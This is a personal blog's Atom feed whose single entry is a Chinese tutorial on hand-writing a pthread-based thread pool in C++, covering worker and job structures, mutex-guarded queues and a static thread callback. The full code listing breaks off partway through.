<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Felix Chen</title>
  
  
  <link href="https://blog.snowflake.zone/friends/atom.xml" rel="self"/>
  
  <link href="https://blog.snowflake.zone/"/>
  <updated>2024-09-23T16:00:00.000Z</updated>
  <id>https://blog.snowflake.zone/</id>
  <follow_challenge>
    <feedId>66144704683264000</feedId>
    <userId>72289996884562944</userId>
  </follow_challenge>
  
  <author>
    <name>Felix Chen</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>C++ 手撕线程池</title>
    <link href="https://blog.snowflake.zone/posts/25/"/>
    <id>https://blog.snowflake.zone/posts/25/</id>
    <published>2024-09-23T16:00:00.000Z</published>
    <updated>2024-09-23T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是线程池"><a class="markdownIt-Anchor" href="#什么是线程池"></a> 什么是线程池？</h2><p><strong>线程池 (Thread Pool) 的基本概念是，在应用程序启动时创建一定数量的线程，并将它们保存在线程池中。当需要执行任务时，从线程池中获取一个空闲的线程，将任务分配给该线程执行。当任务执行完毕后，线程将返回到线程池，可以被其他任务复用。</strong></p><p>在处理某些性能受限的任务时，我们通常会创建新线程来处理该任务，以防止进程被阻塞。这样可以一定程度上提高程序的运行性能；然而，这样的处理方式也存在一个问题：频繁创建并销毁进程也是一个对性能要求较高的操作。线程池就是在这个方面进行了性能优化：我们将已经完成了既定任务的线程保留下来，然后使其直接承接新的任务继续运行。如此一来，处理两个任务时，从原来的 <strong>两次线程创建两次线程销毁</strong> 变成了 <strong>一次创建一次销毁</strong> 。在任务数目庞大时，这样的性能开销差异会更大。</p><h2 id="线程池的设计方案"><a class="markdownIt-Anchor" href="#线程池的设计方案"></a> 线程池的设计方案</h2><p>在着手实现线程池之前，我们需要了解一个线程池需要由什么构成。首先，我们当然需要 <strong>一批线程</strong> ，它们是处理任务的主要成员，就好比工厂中的工人一样。此外，我们还需要一个 <strong>任务队列</strong> ：程序将需要完成的任务放入此队列中，而后不再关心这些任务的状态；当线程池中有线程处于空闲状态时，从任务队列中取出一个任务开始执行。最后，我们需要 <strong>一组接口</strong> ，使得用户可以无需关注线程池的实现细节，而使用简单的接口来提交任务。线程池中任务调度无需暴露给用户，这也是一种面向对象的思想。</p><p>本质上，线程池的组成部分是相对比较简单的。下面的示意图也说明了它们之间的关系。</p><div class="tag-plugin image"><div class="image-bg"><img src="/assets/025/threadPool.png" alt="线程池组成结构" data-fancybox="true"/></div><div class="image-meta"><span class="image-caption center">线程池组成结构</span></div></div><h2 id="线程池的c实现"><a class="markdownIt-Anchor" href="#线程池的c实现"></a> 线程池的C++实现</h2><p>首先，我们需要导入<code>pthread</code>库，该库是C++支持多线程的标准库。在本文中，我们主要使用<code>pthread_create()</code>进行线程创建。</p><h3 id="线程对象的运行时状态管理"><a class="markdownIt-Anchor" href="#线程对象的运行时状态管理"></a> 线程对象的运行时状态管理</h3><p>上面说到过，线程池中需要存在一批线程不断接受任务队列中的任务进行执行。因此，我们需要创建一个用于维护线程状态的结构体<code>TP_WORKER</code>来储存这些信息。我们将该结构体定义如下，相关解释也一并包含在代码中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TP_WORKER</span> &#123;</span><br><span class="line">        <span class="type">pthread_t</span> p;    <span class="comment">// 用于存储线程编号，pthread_t是函数pthread_create()的返回值</span></span><br><span class="line">        ThreadPool* pool;   <span class="comment">// 用于表示该线程隶属于哪个线程池，为防止我们可能在代码中创建不止一个线程池</span></span><br><span class="line">        <span class="type">bool</span> is_running;    </span><br><span class="line">        <span class="type">bool</span> terminate;     <span class="comment">// is_running表示线程是否被占用；terminate表示线程是否被终止，设为真则线程会被销毁</span></span><br><span class="line"></span><br><span class="line">        TP_WORKER* prev;</span><br><span class="line">        TP_WORKER* next;    <span class="comment">// 组成线程链表的指针</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">TP_WORKER</span>()&#123;&#125;   <span class="comment">// 构造函数</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">TP_WORKER</span>(TP_WORKER* p, TP_WORKER* n, ThreadPool* po) &#123;</span><br><span class="line">            prev = p;</span><br><span class="line">            next = n;</span><br><span class="line">            pool = po;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>在我看来，我们也可以使用一个<code>vector</code>数组来存储线程向量。在代码实现上，或许会稍微简单些；但在此笔者选择使用链表的原因在于其可以很方便地离开链表，而<code>vector</code>数组中删除中间元素会产生大量的元素移动，造成性能消耗。</p><h3 id="任务队列设计"><a class="markdownIt-Anchor" href="#任务队列设计"></a> 任务队列设计</h3><p>首先，我们同样需要一个结构体来描述一个任务。简单来说，一个任务就是 <strong>一个带有实参的函数</strong> 。在C++中，我们可以通过声明函数指针的方式来获取函数对象，通过声明一个指针来获得函数的实参。然而，在声明函数指针时，我们需要对该指针匹配的函数的返回值和形参列表做出声明。例如我们声明如下的函数指针<code>func</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">void</span> (*func)(<span class="type">int</span>, <span class="type">int</span>);</span><br></pre></td></tr></table></figure><p>则该函数指针只能匹配具有两个<code>int</code>类形参，并且返回值为<code>void</code>的函数。这显然会带来一个问题， <strong>我们无法预先知道待处理的任务的函数形式！</strong> 这是，我们可以选择一个较为取巧的方式，我们指定函数形式为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* (*func)(<span class="type">void</span> *);</span><br></pre></td></tr></table></figure><p>这样，我们对该函数传参时，可以将所有实参包装成一个结构体实例，并传入结构体实例的指针。例如，我们对函数进行如下改写：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原始函数形式</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printEquation</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; a &lt;&lt; <span class="string">&quot; + &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; a + b &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改写后的匹配函数指针的方式</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">EquationData</span>&#123;</span><br><span class="line">    <span class="type">int</span> _a, _b;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">EquationData</span>(<span class="type">int</span> a, <span class="type">int</span> b): _a(a), _b(b)&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="title">printEquation</span><span class="params">(<span class="type">void</span>* params)</span></span>&#123;</span><br><span class="line">    EquationData* data = (EquationData*)params;</span><br><span class="line">    std::cout &lt;&lt; data-&gt;_a &lt;&lt; <span class="string">&quot; + &quot;</span> &lt;&lt; data-&gt;_b &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; data-&gt;_a + data-&gt;_b &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样的做法能够使得所有函数都可以写成<code>void* (*)(void *)</code>的类型。由此，我们就能很简单地构造出描述任务的结构体<code>TP_JOB</code>了：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TP_JOB</span> &#123;</span><br><span class="line">    <span class="type">void</span>* (*func)(<span class="type">void</span>*);</span><br><span class="line">    <span class="type">void</span>* params;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="线程池中的其它重要参数"><a class="markdownIt-Anchor" href="#线程池中的其它重要参数"></a> 线程池中的其它重要参数</h3><p>在线程池类中，需要一些变量来存储线程池的相关信息，如下列出了这些变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadPool</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// struct TP_WORKER &#123;</span></span><br><span class="line">    <span class="comment">//     ...</span></span><br><span class="line">    <span class="comment">// &#125;;</span></span><br><span class="line">    <span class="comment">// struct TP_JOB &#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// &#125;;</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">TP_CONFIG</span> &#123;</span><br><span class="line">        <span class="type">int</span> _max_job_cnt;   <span class="comment">// 最大排队任务数</span></span><br><span class="line">        <span class="type">int</span> _cur_thread_cnt = <span class="number">0</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    TP_WORKER* _tp_worker_list;  <span class="comment">// 线程链表</span></span><br><span class="line">    <span class="type">pthread_mutex_t</span> _tp_worker_list_mutex;  <span class="comment">// 线程链表锁</span></span><br><span class="line">    queue&lt;TP_JOB&gt; _tp_job_queue;    <span class="comment">// 任务队列</span></span><br><span class="line">    <span class="type">pthread_mutex_t</span> _tp_job_queue_mutex;    <span class="comment">// 任务队列锁</span></span><br><span class="line">    TP_CONFIG _tp_config;</span><br></pre></td></tr></table></figure><p><code>_max_job_cnt</code>表示了线程池的任务队列所能容纳的最多任务数量防止任务堆叠；<code>_cur_thread_cnt</code>储存目前存活的线程数目；<code>_tp_worker_list</code>是线程链表的链表头；<code>_tp_job_queue</code>是任务队列。</p><p>上述变量中，<code>_tp_worker_list</code>和<code>_tp_job_queue</code>属于 <strong>临界资源</strong> 。并发编程中，由于读写变量不是原子操作（由多条CPU指令完成），因此无法防止线程A读出写回过程中线程B不会读出该值，从而导致不一致问题。会被这种情况影响的数据被称为 <strong>临界资源</strong> 。为了防止不一致的问题，我们引入了读写锁<code>_tp_worker_list_mutex</code>和<code>_tp_job_queue_mutex</code>，在读出前尝试获取该锁，在写回后释放锁来防止不一致问题的产生。</p><h3 id="创建线程"><a class="markdownIt-Anchor" href="#创建线程"></a> 创建线程</h3><p>创建线程的函数原型为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">pthread_create</span><span class="params">(<span class="type">pthread_t</span>* restrict tidp,<span class="type">const</span> <span class="type">pthread_attr_t</span>* restrict_attr,<span class="type">void</span>* (*start_rtn)(<span class="type">void</span>*),<span class="type">void</span> *restrict arg)</span></span>;</span><br></pre></td></tr></table></figure><p><code>tidp</code>就是指向我们在<code>TP_WORKER</code>中的<code>pthread_t p</code>字段的指针，表示线程号；<code>restrict_attr</code>区分线程的不同属性，一般来说我们直接设为<code>nullptr</code>即可；<code>start_rtn</code>是一个函数指针，也就是我们本节所讨论的 <strong>回调函数</strong> ，这是新创建的线程的运行入口点；<code>arg</code>是一个参数指针，作为<code>start_rtn</code>的参数。</p><p>在线程池的实现中，我们会使用到上述的方法。接下来，我们实现函数<code>ThreadPool::create_thread()</code>，该函数能够为线程池创建一个新的线程使得其能够完成接取任务、执行任务的工作。</p><p>我们在上面提到过，<code>TP_WORKER</code>是用于管理线程状态的类，因此，在创建线程之前，我们需要初始化一个<code>TP_WORKER</code>实例，同时对该实例的成员变量进行初始化，并将新的<code>worker</code>实例加入线程链表中，代码实现如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">create_thread</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    TP_WORKER* worker = <span class="keyword">new</span> <span class="built_in">TP_WORKER</span>();</span><br><span class="line">    worker-&gt;pool = <span class="keyword">this</span>;</span><br><span class="line">    worker-&gt;terminate = <span class="literal">false</span>;</span><br><span class="line">    worker-&gt;is_running = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// 加入新节点时：</span></span><br><span class="line">    worker-&gt;next = <span class="keyword">this</span>-&gt;_tp_worker_list-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;_tp_worker_list-&gt;next) <span class="keyword">this</span>-&gt;_tp_worker_list-&gt;next-&gt;prev = worker;</span><br><span class="line">    worker-&gt;prev = <span class="keyword">this</span>-&gt;_tp_worker_list;</span><br><span class="line">    <span class="keyword">this</span>-&gt;_tp_worker_list-&gt;next = worker;</span><br><span class="line">    <span class="comment">// 计数器加一</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;_tp_config._cur_thread_cnt += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 注意：此处的 _thread_Callback() 函数我们尚未实现，会在后面进行解释 */</span></span><br><span class="line">    <span class="type">int</span> ret = <span class="built_in">pthread_create</span>(&amp;worker-&gt;p, <span class="literal">nullptr</span>, &amp;_thread_Callback, worker);</span><br><span class="line">    <span class="comment">// if(!ret)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码中主要完成了三件事：1、新建一个<code>TP_WORKER</code>的实例<code>worker</code>，并进行初始化工作；2、将其加入链表之中；3、使用<code>pthread_create()</code>创建了新的线程，并交给<code>worker</code>进行托管。</p><p>值得一提的是，这里使用的线程链表为 <strong>双向链表</strong>， 并且引入了哨兵节点（即<code>_tp_worker_list</code>指向的<code>TP_WORKER</code>实例不具备任何意义）。这种做法只是简化了链表操作期间的边界条件判断问题，具体解释可见<a href="https://developer.aliyun.com/article/1306349">这篇文章</a>。</p><p>之后，我们着重考虑<code>ThreadPool::_thread_Callback()</code>函数的实现，其作为新建线程的入口点。首先，由于<code>pthread_create()</code>参数限制，该函数的原型必须是<code>void* (*)(void *)</code>。然而，我们考虑这样的问题：该函数作为类的成员函数，我们直接声明为如下形式是不可以的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* _thread_Callback(<span class="type">void</span>* pvoid)&#123;&#125;</span><br></pre></td></tr></table></figure><p>具体原因在于：在C++中，类的非静态成员函数会有一个隐藏的<code>this</code>指针指向类的具体实例，以便于进行方法调用时能够准确的操作我们希望操作的类实例。因此，上述函数声明实际声明的是如下的函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* _thread_Callback(ThreadPool* <span class="keyword">this</span>, <span class="type">void</span>* pvoid)&#123;&#125;</span><br></pre></td></tr></table></figure><p>这就会产生编译错误了。因此，正确的函数声明应该为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span>* _thread_Callback(<span class="type">void</span>* pvoid)&#123;&#125;</span><br></pre></td></tr></table></figure><p>函数参数<code>pvoid</code>应传入我们为该线程创建的<code>TP_WORKER</code>实例指针，即<code>worker</code>，以便于在运行过程中能够读取自身状态参数。那么接下来的操作逻辑就比较简单了，用伪代码表示为如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">while(true)&#123;</span><br><span class="line">    if 自身接取了任务:</span><br><span class="line">        完成之</span><br><span class="line">    else:</span><br><span class="line">        if 自己的 terminate 设置为 true:</span><br><span class="line">            销毁自身，释放空间</span><br><span class="line">        else:</span><br><span class="line">            尝试获取一个新的任务，若不存在，则不做任何操作</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用C++实现之，则代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span>* _thread_Callback(<span class="type">void</span>* pvoid) &#123;    <span class="comment">// 需要 static 修饰符以去掉 this 指针</span></span><br><span class="line">    <span class="comment">// init</span></span><br><span class="line">    TP_WORKER* worker = (TP_WORKER*) pvoid;</span><br><span class="line">    worker-&gt;is_running = <span class="literal">false</span>;</span><br><span class="line">    TP_JOB job;</span><br><span class="line">    ThreadPool* pool = worker-&gt;pool;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// 判断是否要终止线程</span></span><br><span class="line">        <span class="keyword">if</span>(worker-&gt;terminate &amp;&amp; !worker-&gt;is_running) &#123;</span><br><span class="line">            <span class="comment">// 将自己从 _tp_worker_list 中剥离</span></span><br><span class="line">            <span class="built_in">pthread_mutex_lock</span>(&amp;(pool-&gt;_tp_worker_list_mutex));</span><br><span class="line">            worker-&gt;prev-&gt;next = worker-&gt;next;</span><br><span class="line">            <span class="keyword">if</span>(worker-&gt;next) &#123;</span><br><span class="line">                worker-&gt;next-&gt;prev = worker-&gt;prev;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">pthread_mutex_unlock</span>(&amp;(pool-&gt;_tp_worker_list_mutex));</span><br><span class="line">            <span class="comment">// 释放内存空间并退出</span></span><br><span class="line">            <span class="keyword">delete</span> worker;</span><br><span class="line">            <span class="built_in">pthread_exit</span>(<span class="literal">nullptr</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 判断是否空闲</span></span><br><span class="line">        <span class="keyword">if</span>(!worker-&gt;is_running) &#123;   <span class="comment">// 未运行，尝试获取任务</span></span><br><span class="line">            <span class="built_in">pthread_mutex_lock</span>(&amp;(pool-&gt;_tp_job_queue_mutex));</span><br><span class="line">            <span class="keyword">if</span>(!pool-&gt;_tp_job_queue.<span class="built_in">empty</span>()) &#123;    <span class="comment">// 获取任务</span></span><br><span class="line">                job = (pool-&gt;_tp_job_queue).<span class="built_in">front</span>();</span><br><span class="line">                pool-&gt;_tp_job_queue.<span class="built_in">pop</span>();</span><br><span class="line">                worker-&gt;is_running = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">pthread_mutex_unlock</span>(&amp;(pool-&gt;_tp_job_queue_mutex));</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 已有任务，则运行</span></span><br><span class="line">            <span class="type">void</span>* res = job.<span class="built_in">func</span>(job.params);</span><br><span class="line">            <span class="built_in">printRes</span>((<span class="type">int</span>)worker-&gt;p, *(<span class="type">int</span> *)res);</span><br><span class="line">            worker-&gt;is_running = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="完整代码"><a class="markdownIt-Anchor" href="#完整代码"></a> 完整代码</h2><p>完整的代码如下，可供读者参考借鉴：</p><details class="tag-plugin colorful folding" ><summary><span>线程池的简单C++实现</span></summary><div class="body"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">pthread_mutex_t</span> print_mutex = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printRes</span><span class="params">(<span class="type">int</span> no, <span class="type">int</span> res)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">pthread_mutex_lock</span>(&amp;print_mutex);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Answer: &quot;</span> &lt;&lt; res &lt;&lt; <span class="string">&quot; Computed by thread: &quot;</span> &lt;&lt; no &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">pthread_mutex_unlock</span>(&amp;print_mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadPool</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">TP_WORKER</span> &#123;</span><br><span class="line">        <span class="type">pthread_t</span> p;</span><br><span class="line">        ThreadPool* pool;</span><br><span class="line">        <span class="type">bool</span> is_running;</span><br><span class="line">        <span class="type">bool</span> terminate;</span><br><span class="line"></span><br><span class="line">        TP_WORKER* prev;</span><br><span class="line">        TP_WORKER* next;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">TP_WORKER</span>()&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">TP_WORKER</span>(TP_WORKER* p, TP_WORKER* n, ThreadPool* po) &#123;</span><br><span class="line">            prev = p;</span><br><span class="line">            next = n;</span><br><span class="line">            pool = po;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">TP_JOB</span> &#123;</span><br><span class="line">        <span class="type">void</span>* (*func)(<span class="type">void</span>*);</span><br><span class="line">        <span class="type">void</span>* params;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">TP_CONFIG</span> &#123;</span><br><span class="line">        <span class="type">int</span> _max_job_cnt;   <span class="comment">// 最大排队任务数</span></span><br><span class="line">        <span class="type">int</span> _cur_thread_cnt = <span class="number">0</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    TP_WORKER* _tp_worker_list;  <span class="comment">// 线程链表</span></span><br><span class="line">    <span class="type">pthread_mutex_t</span> _tp_worker_list_mutex;  <span class="comment">// 线程链表锁</span></span><br><span class="line">    queue&lt;TP_JOB&gt; _tp_job_queue;    <span class="comment">// 任务队列</span></span><br><span class="line">    <span class="type">pthread_mutex_t</span> _tp_job_queue_mutex;    <span class="comment">// 任务队列锁</span></span><br><span class="line">    TP_CONFIG _tp_config;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">void</span>* _thread_Callback(<span class="type">void</span>* pvoid) &#123;    <span class="comment">// 需要 static 修饰符以去掉 this 指针</span></span><br><span class="line">        <span class="comment">// init</span></span><br><span class="line">        TP_WORKER* worker = (TP_WORKER*) pvoid;</span><br><span class="line">        worker-&gt;is_running = <span class="literal">false</span>;</span><br><span class="line">        TP_JOB job;</span><br><span class="line">        ThreadPool* pool = worker-&gt;pool;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="comment">// 判断是否要终止线程</span></span><br><span class="line">            <span class="keyword">if</span>(worker-&gt;terminate &amp;&amp; !worker-&gt;is_running) &#123;</span><br><span class="line">                <span class="comment">// 将自己从 _tp_worker_list 中剥离</span></span><br><span class="line">                <span class="built_in">pthread_mutex_lock</span>(&amp;(pool-&gt;_tp_worker_list_mutex));</span><br><span class="line">                worker-&gt;prev-&gt;next = worker-&gt;next;</span><br><span class="line">                <span class="keyword">if</span>(worker-&gt;next) &#123;</span><br><span class="line">                    worker-&gt;next-&gt;prev = worker-&gt;prev;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">pthread_mutex_unlock</span>(&amp;(pool-&gt;_tp_worker_list_mutex));</span><br><span class="line">                